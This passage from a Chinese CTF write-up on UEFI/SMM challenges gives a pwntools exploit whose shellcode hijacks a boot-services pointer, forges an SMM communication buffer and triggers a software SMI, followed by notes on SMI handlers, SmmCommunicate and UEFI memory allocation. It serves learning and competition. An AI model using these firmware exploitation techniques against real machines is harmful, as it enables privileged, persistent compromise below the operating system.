class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者直接修改全局变量并使用out触发smi</p><p><del>不过还不是很清楚是怎么定位这些全局变量的(<strong>特别是smm_buffer</strong>),反编译去找?,不太懂,所以还是更喜欢第一种方法</del>(已解决)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./run.sh&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a, b)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">smm_buffer = <span class="number">0x6ad9380</span></span><br><span class="line">guid = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;1EF11CB3F3B786EC72088E54B1F4769D&#x27;</span>)</span><br><span class="line">CommBuffer_offset = <span class="number">56</span></span><br><span class="line">BufferSize_offset = CommBuffer_offset + <span class="number">8</span></span><br><span class="line">ReturnStatus_offset = BufferSize_offset + <span class="number">8</span></span><br><span class="line">bootservice = <span class="number">0x6FD6B80</span></span><br><span class="line">backdoor = <span class="number">0x7F06000</span></span><br><span class="line">payload = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">              </span></span><br><span class="line"><span class="string">mov rcx, 0x6FD6B80/* gBS-&gt;LocateProtocol = PrintFlag */</span></span><br><span class="line"><span class="string">add rcx, 0x140</span></span><br><span class="line"><span class="string">mov rdx, 0x7F06000</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x6ad9400/* CommBuffer-&gt;HeaderGuid = ToySmmGuid */</span></span><br><span class="line"><span class="string">mov rdx, 0xEC86B7F3B31CF11E</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8</span></span><br><span class="line"><span class="string">mov rdx, 0x9D76F4B1548E0872</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8/* CommBuffer-&gt;MessageLength = 4 */</span></span><br><span class="line"><span class="string">mov rdx, 0x4</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 24/* CommBuffer-&gt;Data[24] = &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="string">mov rdx, 0x41414141</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x6ad93b8/* mSmmCorePrivateData-&gt;CommunicationBuffer = CommBuffer */</span></span><br><span class="line"><span class="string">mov rdx, 0x6ad9400</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8/* mSmmCorePrivateData-&gt;BufferSize = 0x1c */</span></span><br><span class="line"><span class="string">mov rdx, 0x1c</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor eax, eax/* SMI */</span></span><br><span class="line"><span class="string">mov dx, 0xb2</span></span><br><span class="line"><span class="string">mov al, 0x00</span></span><br><span class="line"><span class="string">outb dx, al</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Your shellcode:&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">sl(payload.<span class="built_in">hex</span>())</span><br><span class="line">sl(<span class="string">&quot;DONE&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>我们任意反汇编一个UEFI程序都可以看到其调用约定是<a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">Microsoft x64</a>，因此参数在RCX、RDX、R8、R9中，然后堆栈。</p><h2 id="uefishell"><a href="#uefishell" class="headerlink" title="uefishell"></a>uefishell</h2><p>大多数的uefi类题目,最终提供给我们的交互接口都是一个<a href="https://github.com/pbatard/UEFI-Shell">uefishell</a>,其允许我们直接输入机器码的十六进制表示,然后去以<code>ring 0</code>的身份去执行</p><p>然后出题人自己打上一些patch</p><p>最后我们能够直接看到的efi程序,一般就是这个</p><p>然后其一般还会能够与一个SMM驱动程序交互</p><p>当然其实也不一定,也有菜单类的uefi题目</p><h2 id="GUID"><a href="#GUID" class="headerlink" title="GUID"></a>GUID</h2><p>UEFI中每一个protocol与服务都会有一个GUID(全局唯一标识符Globally Unique Identifier)</p><p>很多交互接口都需要用到guid去寻找对应的protocol</p><p>在ida中很容易找到对应的guid</p><p>对于一些全局变量来说<strong>,其guid是始终固定的</strong></p><p>常见的如下(基于edk2)</p><div class="table-container"><table><thead><tr><th>name</th><th>guid</th></tr></thead><tbody><tr><td>gEfiSmmCommunicationProtocolGuid</td><td>0x32c3c5ac65db949d4cbd9dc6c68ed8e2</td></tr><tr><td></td><td></td></tr><tr><td></td></tr></tbody></table></div><h2 id="与SMM通信"><a href="#与SMM通信" class="headerlink" title="与SMM通信"></a>与SMM通信</h2><p>一般uefi题目都会有两个关键的文件,分别是</p><ol><li>前面提到的UEFIshell驱动处理程序,其是一个普通的uefi驱动程序,处于ring 0</li><li>以及一个运行在SMM状态下的模块(可能需要从OVMF.fd中提取)</li></ol><p>我们真正需要关心的其实就是两者之间的交互</p><p>对于后者,其在执行时一般都会有运行类似这样一段代码注册一个要执行的处理程序(SMI handler)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gSmst-&gt;SmiHandlerRegister (</span><br><span class="line">                  SmmCowsayHandler,</span><br><span class="line">                  &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">                  &amp;DispatchHandle</span><br><span class="line">                  );</span><br></pre></td></tr></table></figure><p>当 SMI 发生时，EDK2 注册的 SMI 处理程序会遍历已注册处理程序的链接列表，并选择合适的处理程序来运行。</p><p><strong>第二个参数就是指向这个handler的guid的指针</strong>,经常能用上</p><p><code>SmiHandlerRegister</code>声明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmiHandlerRegister</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span></span><br><span class="line"><span class="params">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span></span><br><span class="line"><span class="params">  OUT EFI_HANDLE                    *DispatchHandle</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  SMI_HANDLER  *SmiHandler;</span><br><span class="line">  SMI_ENTRY    *SmiEntry;</span><br><span class="line">  LIST_ENTRY   *List;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((Handler == <span class="literal">NULL</span>) || (DispatchHandle == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SmiHandler = AllocateZeroPool (<span class="keyword">sizeof</span> (SMI_HANDLER));</span><br><span class="line">  <span class="keyword">if</span> (SmiHandler == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_OUT_OF_RESOURCES;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SmiHandler-&gt;Signature  = SMI_HANDLER_SIGNATURE;</span><br><span class="line">  SmiHandler-&gt;Handler    = Handler;</span><br><span class="line">  SmiHandler-&gt;CallerAddr = (UINTN)RETURN_ADDRESS (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (HandlerType == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This is root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = &amp;mRootSmiEntry;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// None root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, TRUE);</span><br><span class="line">    <span class="keyword">if</span> (SmiEntry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_OUT_OF_RESOURCES;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  List = &amp;SmiEntry-&gt;SmiHandlers;</span><br><span class="line"></span><br><span class="line">  SmiHandler-&gt;SmiEntry = SmiEntry;</span><br><span class="line">  InsertTailList (List, &amp;SmiHandler-&gt;Link);</span><br><span class="line"></span><br><span class="line">  *DispatchHandle = (EFI_HANDLE)SmiHandler;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>对于前者其一般使用<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>协议提供的<code>Communicate()</code>方法与一个smm交流</p><p>在递归套娃后<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>其实就是下面这个结构体,其只有一个成员<code>Communicate</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EFI_MM_COMMUNICATION_PROTOCOL</span> &#123;</span></span><br><span class="line">  EFI_MM_COMMUNICATE    Communicate;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>EFI_MM_COMMUNICATE</code>的定义没找着,但根据一些线索,我们能够知道他是一个函数指针</p><p>常见的其被初始化为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">**/</span><br><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmmCommunicationCommunicate</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span></span><br><span class="line"><span class="params">  IN OUT VOID                              *CommBuffer,</span></span><br><span class="line"><span class="params">  IN OUT UINTN                             *CommSize OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  EFI_STATUS                  Status;</span><br><span class="line">  EFI_SMM_COMMUNICATE_HEADER  *CommunicateHeader;</span><br><span class="line">  BOOLEAN                     OldInSmm;</span><br><span class="line">  UINTN                       TempCommSize;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check parameters</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (CommBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommBuffer;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CommSize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    TempCommSize = OFFSET_OF (EFI_SMM_COMMUNICATE_HEADER, Data) + CommunicateHeader-&gt;MessageLength;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    TempCommSize = *CommSize;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// CommSize must hold HeaderGuid and MessageLength</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (TempCommSize &lt; OFFSET_OF (EFI_SMM_COMMUNICATE_HEADER, Data)) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// If not already in SMM, then generate a Software SMI</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">if</span> (!gSmmCorePrivate-&gt;InSmm &amp;&amp; gSmmCorePrivate-&gt;SmmEntryPointRegistered) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Put arguments for Software SMI in gSmmCorePrivate</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    gSmmCorePrivate-&gt;CommunicationBuffer = CommBuffer;</span><br><span class="line">    gSmmCorePrivate-&gt;BufferSize          = TempCommSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Generate Software SMI</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    Status = mSmmControl2-&gt;Trigger (mSmmControl2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (EFI_ERROR (Status)) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_UNSUPPORTED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Return status from software SMI</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (CommSize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      *CommSize = gSmmCorePrivate-&gt;BufferSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gSmmCorePrivate-&gt;ReturnStatus;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><p>第一个参数是指向这个<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>的指针</p></li><li><p>第二个参数一般是一个<code>EFI_SMM_COMMUNICATE_HEADER</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  EFI_GUID             HeaderGuid;</span><br><span class="line">  UINTN                MessageLength;</span><br><span class="line">  UINT8                Data[ANYSIZE_ARRAY];</span><br><span class="line">&#125;   EFI_SMM_COMMUNICATE_HEADER;</span><br></pre></td></tr></table></figure><ul><li><p><code>HeaderGuid</code></p><p>Allows for disambiguation of the message format. Type <em>EFI_GUID</em> is defined in <em>InstallProtocolInterface()</em> .</p></li><li><p><code>MessageLength</code></p><p>Describes the size of <em>Data</em> (in bytes) and does not include the size of the header.</p></li><li><p><code>Data</code></p><p>Designates an array of bytes that is <em>MessageLength</em> in size</p></li></ul></li><li><p>第三个参数是size,一般不需要特意指定为NULL即可</p></li></ul><p>该函数将消息复制到全局变量中<strong>并触发软件 SMI 来处理它</strong>。<u>该消息包含我们想要通信的SMM处理程序的GUID，进入SMM时在已注册处理程序的链表中搜索该GUID。</u></p><hr><p>所以,一般这类题目都需要着重分析题目SMM程序注册的handler</p><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>bootservices中有这两个指针<strong>AllocatePages</strong>与<strong>AllocatePool</strong>都可以用于分配内存</p><blockquote><p>AllocatePages</p><p>Allocates pages of a particular type.</p></blockquote><p><strong>Summary</strong></p><p>Allocates memory pages from the system.</p><p><strong>Prototype</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI *EFI_ALLOCATE_PAGES) (</span><br><span class="line">   IN EFI_ALLOCATE_TYPE                   Type,</span><br><span class="line">   IN EFI_MEMORY_TYPE                     MemoryType,</span><br><span class="line">   IN UINTN                               Pages,</span><br><span class="line">   IN OUT EFI_PHYSICAL_ADDRESS            *Memory</span><br><span class="line">   );</span><br></pre></td></tr></table></figure><p><strong>Parameters</strong></p><ul><li><p>Type</p><p>The type of allocation to perform. See “Related Definitions.”</p></li><li><p>MemoryType</p><p>The type of memory to allocate. The type EFI_MEMORY_TYPE is defined in “Related Definitions” below. These memory types are also described in more detail in <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#memory-type-usage-before-exitbootservices">Memory Type Usage before ExitBootServices()</a>, and <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#memory-type-usage-after-exitbootservices">Memory Type Usage after ExitBootServices()</a> . Normal allocations (that is, allocations by any UEFI application) are of type EfiLoaderData. <em>MemoryType</em> values in the range 0x70000000..0x7FFFFFFF are reserved for OEM use. <em>MemoryType</em> values in the range 0x80000000..0xFFFFFFFF are reserved for use by UEFI OS loaders that are provided by operating system vendors.</p></li><li><p>Pages</p><p>The number of contiguous 4 KiB pages to allocate.</p></li><li><p>Memory</p><p>Pointer to a physical address. On input, the way in which the address is used depends on the value of <em>Type</em>. See “Description” for more information. On output the address is set to the base of the page range that was allocated. See “Related Definitions.”</p></li></ul><p><strong>NOTE</strong>: UEFI Applications, UEFI Drivers, and UEFI OS Loaders <em>must not allocate memory of types</em> EfiReservedMemoryType, EfiMemoryMappedIO, <em>and</em> EfiUnacceptedMemoryType.</p><p><strong>Related Definitions</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_ALLOCATE_TYPE</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">// These types are discussed in the &quot;Description&quot; section below.</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">   AllocateAnyPages,</span><br><span class="line">   AllocateMaxAddress,</span><br><span class="line">   AllocateAddress,</span><br><span class="line">   MaxAllocateType</span><br><span class="line">&#125; EFI_ALLOCATE_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_MEMORY_TYPE</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">// These type values are discussed in Memory Type Usage before ExitBootServices()  and  Memory Type Usage after ExitBootServices().</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">   EfiReservedMemoryType,</span><br><span class="line">   EfiLoaderCode,</span><br><span class="line">   EfiLoaderData,</span><br><span class="line">   EfiBootServicesCode,</span><br><span class="line">   EfiBootServicesData,</span><br><span class="line">   EfiRuntimeServicesCode,</span><br><span class="line">   EfiRuntimeServicesData,</span><br><span class="line">   EfiConventionalMemory,</span><br><span class="line">   EfiUnusableMemory,</span><br><span class="line">   EfiACPIReclaimMemory,</span><br><span class="line">   EfiACPIMemoryNVS,</span><br><span class="line">   EfiMemoryMappedIO,</span><br><span class="line">   EfiMemoryMappedIOPortSpace,</span><br><span class="line">   EfiPalCode,</span><br><span class="line">   EfiPersistentMemory,</span><br><span class="line">   EfiUnacceptedMemoryType,</span><br><span class="line">   EfiMaxMemoryType</span><br><span class="line">&#125; EFI_MEMORY_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_PHYSICAL_ADDRESS</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="keyword">typedef</span> UINT64 EFI_PHYSICAL_ADDRESS;</span><br></pre></td></tr></table></figure><p><strong>Description</strong></p><p>The AllocatePages() function allocates the requested number of pages and returns a pointer to the base address of the page range in the location referenced by <em>Memory</em>. The function scans the memory map to locate free pages. When it finds a physically contiguous block of pages that is large enough and also satisfies the allocation requirements of <em>Type</em>, it changes the memory map to indicate that the pages are now of type <em>MemoryType</em>.</p><p>In general, UEFI OS loaders and UEFI applications should allocate memory (and pool) of type EfiLoaderData. UEFI boot service drivers must allocate memory (and pool) of type EfiBootServicesData. UREFI runtime drivers should allocate memory (and pool) of type EfiRuntimeServicesData (although such allocation can only be made during boot services time).</p><p>Allocation requests of <em>Type</em> AllocateAnyPages allocate any available range of pages that satisfies the request. On input, the address pointed to by <em>Memory</em> is ignored.</p><p>Allocation requests of <em>Type</em> <em>AllocateMaxAddress</em> allocate any available range of pages whose uppermost address is less than or equal to the address pointed to by <em>Memory</em> on input.</p><p>Allocation requests of <em>Type</em> AllocateAddress allocate pages at the address pointed to by <em>Memory</em> on input.</p><p><strong>NOTE</strong>: <em>UEFI drivers and UEFI applications that are not targeted for a specific implementation must perform memory allocations for the following runtime types using AllocateAnyPages address mode:</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EfiACPIReclaimMemory,</span><br><span class="line">EfiACPIMemoryNVS,</span><br><span class="line">EfiRuntimeServicesCode,</span><br><span class="line">EfiRuntimeServicesData,</span><br><span class="line">EfiReservedMemoryType.</span><br></pre></td></tr></table></figure><p><strong>Status Codes Returned</strong></p><div class="table-container"><table><thead><tr><th>EFI_SUCCESS</th><th>The requested pages were allocated.</th></tr></thead><tbody><tr><td>EFI_OUT_OF_RESOURCEST</td><td>The pages could not be allocated.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>Type</em> is not AllocateAnyPages or AllocateMaxAddress or AllocateAddress</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>MemoryType</em> is in the range EfiMaxMemoryType..0x6FFFFFFF.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>MemoryType</em> is EfiPersistentMemoryType or EfiUnacceptedMemory.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>Memory</em> is NULL.</td></tr><tr><td>EFI_NOT_FOUND</td><td>The requested pages could not be found.</td></tr></tbody></table></div><hr><blockquote><p>AllocatePool</p><p>Allocates a pool of a particular type.</p></blockquote><p><strong>Summary</strong></p><p>Allocates pool memory.</p><p><strong>Prototype</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI  *EFI_ALLOCATE_POOL) (</span><br><span class="line">   IN EFI_MEMORY_TYPE            PoolType,</span><br><span class="line">   IN UINTN                      Size,</span><br><span class="line">   OUT VOID                      **Buffer</span><br><span class="line">   );</span><br></pre></td></tr></table></figure><p><strong>Parameters</strong></p><ul><li><p>PoolType</p><p>The type of pool to allocate. Type EFI_MEMORY_TYPE is defined in the <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-allocatepages">EFI_BOOT_SERVICES.AllocatePages()</a> function description. <em>PoolType</em> values in the range 0x70000000..0x7FFFFFFF are reserved for OEM use. <em>PoolType</em> values in the range 0x80000000..0xFFFFFFFF are reserved for use by UEFI OS loaders that are provided by operating system vendors.</p></li><li><p>Size</p><p>The number of bytes to allocate from the pool.</p></li><li><p>Buffer</p><p>A pointer to a pointer to the allocated buffer if the call succeeds; undefined otherwise.</p></li></ul><p><strong>Note:</strong> <em>UEFI applications and UEFI drivers must not allocate memory of type</em> EfiReservedMemoryType.</p><p><strong>Description</strong></p><p>The AllocatePool() function allocates a memory region of Size bytes from memory of type <em>PoolType</em> and returns the address of the allocated memory in the location referenced by <em>Buffer</em>. This function allocates pages from EfiConventionalMemory as needed to grow the requested pool type. All allocations are eight-byte aligned.</p><p>The allocated pool memory is returned to the available pool with the <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#id17">EFI_BOOT_SERVICES.FreePool()</a> function.</p><p><strong>Status Codes Returned</strong></p><div 